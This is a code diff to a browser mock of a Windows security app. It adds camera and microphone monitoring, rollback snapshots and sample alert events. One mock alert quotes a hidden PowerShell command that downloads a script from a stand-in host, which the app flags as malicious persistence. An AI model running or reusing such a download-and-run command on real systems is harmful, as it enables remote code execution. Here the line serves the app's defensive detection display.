@@ -1,6 +1,6 @@
 // Browser-only stand-in for the engine. Never used inside the Tauri app.
 
-import type { EngineStatus, QuarantineItem, ScanKind, SecurityEvent, Settings } from "./types";
+import type { DeviceUse, EngineStatus, FileChange, QuarantineItem, ScanKind, SecurityEvent, Settings, Snapshot } from "./types";
 
 const now = () => Math.floor(Date.now() / 1000);
 let nextId = 100;
@@ -39,11 +39,31 @@ const settings: Settings = {
   block_office_children: true,
   entropy_detection: true,
   network_guard: true,
+  privacy_monitor: true,
+  rollback_snapshots: true,
+  rollback_interval_hours: 4,
   auto_update_app: true,
   app_update_api: null,
   trusted_apps: [{ path: "C:\\Users\\alex\\Downloads\\tools\\putty.exe", sha256: "9f".repeat(32) }],
 };
 let lsaOn = false;
+const devices: DeviceUse[] = [
+  { device: "camera", app: "Zoom.exe", path: "C:\\Users\\alex\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", user: "S-1-5-21-1", in_use: true, last_started: now() - 420, last_stopped: null },
+  { device: "microphone", app: "Zoom.exe", path: "C:\\Users\\alex\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", user: "S-1-5-21-1", in_use: true, last_started: now() - 420, last_stopped: null },
+  { device: "microphone", app: "Discord.exe", path: "C:\\Users\\alex\\AppData\\Local\\Discord\\app-1.0.9\\Discord.exe", user: "S-1-5-21-1", in_use: false, last_started: now() - 86400, last_stopped: now() - 82000 },
+  { device: "camera", app: "Microsoft.WindowsCamera", path: null, user: "S-1-5-21-1", in_use: false, last_started: now() - 3 * 86400, last_stopped: now() - 3 * 86400 + 95 },
+];
+let snapshots: Snapshot[] = [
+  { id: "{6C1F2B4E-8A3D-4E5F-9B7A-1D2C3E4F5A6B}", created_at: now() - 2 * 3600, volume: "C:\\", ours: true },
+  { id: "{0A1B2C3D-4E5F-6A7B-8C9D-0E1F2A3B4C5D}", created_at: now() - 6 * 3600, volume: "C:\\", ours: true },
+  { id: "{FEDCBA98-7654-3210-FEDC-BA9876543210}", created_at: now() - 4 * 86400, volume: "C:\\", ours: false },
+];
+const mockChanges: FileChange[] = [
+  { path: "C:\\Users\\alex\\Documents\\Taxes 2025.xlsx", change: "modified", size_then: 48_211, size_now: 48_240, modified_at: now() - 900, looks_encrypted: true },
+  { path: "C:\\Users\\alex\\Pictures\\Holiday\\IMG_2041.jpg", change: "modified", size_then: 3_204_112, size_now: 3_204_144, modified_at: now() - 905, looks_encrypted: true },
+  { path: "C:\\Users\\alex\\Documents\\CV.docx", change: "deleted", size_then: 120_331, size_now: null, modified_at: null, looks_encrypted: false },
+  { path: "C:\\Users\\alex\\Documents\\notes.txt", change: "modified", size_then: 2_100, size_now: 2_310, modified_at: now() - 3000, looks_encrypted: false },
+];
 let appUpdate: string | null = "Up to date (build 14)";
 let lastUpdate = now() - 3 * 3600;
 let updating = false;
@@ -60,12 +80,14 @@ let quarantine: QuarantineItem[] = [
 ];
 
 const events: SecurityEvent[] = [
+  { id: 8, timestamp: now() - 420, kind: "device_access", severity: "low", title: "Camera turned on by Zoom.exe", detail: "Zoom.exe started using your camera.", path: "C:\\Users\\alex\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", pid: null },
+  { id: 7, timestamp: now() - 200, kind: "persistence_change", severity: "high", title: "New scheduled task", detail: "Runs: \"powershell.exe\" -WindowStyle Hidden -Command iwr https://x.example/a.ps1. Red flags: runs a script host / system tool often abused by malware; hidden or encoded PowerShell; downloads from the internet. If you did not install something that needs this, disable it.", path: "\\WindowsUpdateHelper", pid: null },
   { id: 6, timestamp: now() - 300, kind: "process_blocked", severity: "high", title: "Blocked unsigned program from Downloads", detail: "Execution Guard stops programs without a valid digital signature when they start from Downloads, where malware usually lands. If you trust it, choose Always allow.", path: "C:\\Users\\alex\\Downloads\\cool-tool.exe", pid: 9120 },
   { id: 5, timestamp: now() - 600, kind: "process_suspended", severity: "critical", title: "Suspended encryptor.exe", detail: "It wrote 48.2 MB in 1 second right after the decoy changed. It is frozen, not killed: choose Terminate (and quarantine it) or Resume in Activity.", path: "C:\\Users\\alex\\AppData\\Local\\Temp\\encryptor.exe", pid: 7344 },
   { id: 4, timestamp: now() - 601, kind: "behavior_alert", severity: "critical", title: "Ransomware behaviour: a decoy file was changed", detail: "A hidden decoy file was modified. Legitimate programs never touch it.", path: "C:\\Users\\alex\\Documents\\!_Accounts_2026.xlsx", pid: null },
   { id: 3, timestamp: now() - 5400, kind: "threat_quarantined", severity: "info", title: "EICAR-Test-File moved to quarantine", detail: null, path: quarantine[0].original_path, pid: null },
   { id: 2, timestamp: now() - 5401, kind: "threat_detected", severity: "high", title: "EICAR-Test-File detected", detail: "Found by File Shield", path: quarantine[0].original_path, pid: null },
-  { id: 1, timestamp: now() - 7200, kind: "service_info", severity: "info", title: "Sentinel-Lite engine started", detail: "2 signatures loaded", path: null, pid: null },
+  { id: 1, timestamp: now() - 7200, kind: "service_info", severity: "info", title: "Vigil engine started", detail: "2 signatures loaded", path: null, pid: null },
 ];
 
 const scan = {
@@ -109,6 +131,9 @@ function status(): EngineStatus {
     network_blocked_ranges: settings.network_guard ? 1489 : 0,
     build: 14,
     app_update_status: appUpdate,
+    devices_in_use: settings.privacy_monitor ? devices.filter((d) => d.in_use) : [],
+    last_snapshot: snapshots.filter((s) => s.ours)[0]?.created_at ?? null,
+    snapshot_error: null,
     hardening: [
       { id: "lsa_protection", name: "LSA protection (credential theft)", ok: lsaOn, detail: lsaOn ? "LSASS runs as a protected process." : "Off. Turning it on stops tools like Mimikatz from reading passwords out of LSASS memory. Takes effect after a restart.", fixable: !lsaOn },
       { id: "firewall", name: "Windows Firewall", ok: true, detail: "On for all network profiles.", fixable: false },
@@ -192,6 +217,22 @@ export const mock = {
             push({ kind: "signatures_updated", severity: "info", title: "Signatures updated: 412 new", detail: "MalwareBazaar: 412 hashes", path: null, pid: null });
           }, 1500);
           return undefined;
+        case "disable_task":
+          push({ kind: "persistence_change", severity: "info", title: "Scheduled task disabled", detail: `${args.name} will no longer run.`, path: null, pid: null });
+          return undefined;
+        case "get_device_usage": return devices;
+        case "list_snapshots": return snapshots;
+        case "create_snapshot":
+          snapshots = [{ id: `{${crypto.randomUUID().toUpperCase()}}`, created_at: now(), volume: "C:\\", ours: true }, ...snapshots];
+          push({ kind: "recovery", severity: "info", title: "Rollback snapshot taken", detail: "Files on C:\\ can be rolled back to this point if ransomware strikes.", path: null, pid: null });
+          return undefined;
+        case "rollback_preview": return { changes: mockChanges, truncated: false };
+        case "rollback_restore": {
+          const paths = args.paths as string[];
+          for (const p of paths) mockChanges.splice(mockChanges.findIndex((c) => c.path === p), 1);
+          push({ kind: "recovery", severity: "info", title: `Restored ${paths.length} file(s) from the snapshot`, detail: "The versions they replaced were moved to C:\\Users\\alex\\Vigil Restore Backup.", path: null, pid: null });
+          return undefined;
+        }
         case "get_events": return events.slice(0, (args.limit as number) ?? 100);
         case "list_quarantine": return quarantine;
         case "restore_quarantine":
